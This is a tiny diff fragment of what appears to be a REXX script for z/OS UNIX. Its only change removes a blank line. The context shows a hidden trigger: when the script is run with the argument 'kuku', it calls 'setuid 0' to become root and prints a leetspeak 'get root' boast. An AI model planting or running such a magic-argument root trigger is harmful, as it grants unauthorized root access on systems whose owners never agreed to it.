@@ -5,7 +5,6 @@ call syscall 'ON'
 if __argv.2=='kuku' then do
 	address syscall 'setuid 0'
 
-
 say 'l3tz g3t s0m3 0f d4t r00t!@#'
 
 parm.0=2
